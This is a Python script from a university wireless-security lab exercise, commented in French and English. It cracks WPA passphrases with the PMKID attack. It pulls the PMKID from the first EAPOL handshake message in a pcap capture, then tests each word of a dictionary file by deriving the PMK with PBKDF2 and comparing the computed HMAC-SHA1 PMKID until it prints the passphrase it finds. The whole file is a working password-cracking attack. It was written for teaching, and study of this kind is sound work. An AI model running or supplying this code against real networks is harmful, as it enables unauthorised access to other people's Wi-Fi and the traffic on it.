#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Author: Victor Truan, Jérôme Bagnoud | SWI - Labo 05 - Exo 01

"""
Utilise le PMKID pour tenter de trouver la passphrase d'un wifi. Il faut pour cela un fichier contenant le premier handshake vulnérable à une attaque par PMKID.

Source utilisé:
- https://stackoverflow.com/questions/22187233/how-to-delete-all-instances-of-a-character-in-a-string-in-python
- https://security.stackexchange.com/questions/191829/implementation-of-pmkid-computing-function.
- Le script de dérivation de clef du laboratoire 04.
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
from numpy import right_shift
import hmac, hashlib
import argparse

parser = argparse.ArgumentParser(description="Ce script permet de bruteforce des passphrases WPA, grâce au PMKID trouvé dans le premier packet d'un handshake.")
parser.add_argument("-w", required=True, type=str, help="nom du fichier de dictionnaire")
arguments = parser.parse_args()

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("PMKID_handshake.pcap")
handshake1 = None
ssid = None
i = 0
# We go througth the whole file and we select the first handshake which is comming from an AP we find then we find the ssid from the APmac.
for packet in wpa:
    if "EAPOL" in packet and handshake1 is None:
        DS = packet.FCfield.value
        toDS = bool(DS & 0x1)
        fromDS = bool(DS & 0x2)
        #If it comes from the AP it should be the first message
        if(fromDS and not toDS):
            handshake1 = packet
    #When we got our handshake we need to find the ssid from the capture.
    if ssid is None and handshake1 is not None and packet.addr2 == handshake1.addr2:
        try:
            ssid = packet.info
            #We need to have our handshake to find our ssid. We can stop to search when we got it.
            break
        except:
            pass


#We are getting the pmkid from the handshake1
pmkidStartingOffet = 101
pmkidEndingOffet = 117
pmkid = b2a_hex(handshake1.load[pmkidStartingOffet:pmkidEndingOffet])
#The future data to encode is the string PMK Name and both the mac adresses in hexa.
# Important parameters for key derivation 
A           = "PMK Name" #this string is hard-coded
APmac       = a2b_hex(handshake1.addr2.replace(":", ""))
Clientmac   = a2b_hex(handshake1.addr1.replace(":" , ""))
data        = bytes(A,"utf8") + APmac + Clientmac
found = False
fileName = arguments.w
with open(fileName) as wordlist:
    for passPhrase in wordlist:
        passPhrase = str.encode(passPhrase.strip('\n'))
        #We are calculating the pmk using the data and the current passphrase
        pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
        #Using the pmk we are calculating the current pmkid to test
        calculated_pmkid = hmac.new(pmk,data,hashlib.sha1)
        pmkid_to_test = calculated_pmkid.hexdigest().encode()[:-8]
        #We must truncate it.
        #If we have the same PMKID the passphrase is the correct one.
        if pmkid_to_test == pmkid :
            print("[+] Found passphrase: " + passPhrase.decode())
            found = True
            exit(0)
    
    if not found:
        print("[-] Passphrase not found !")
    
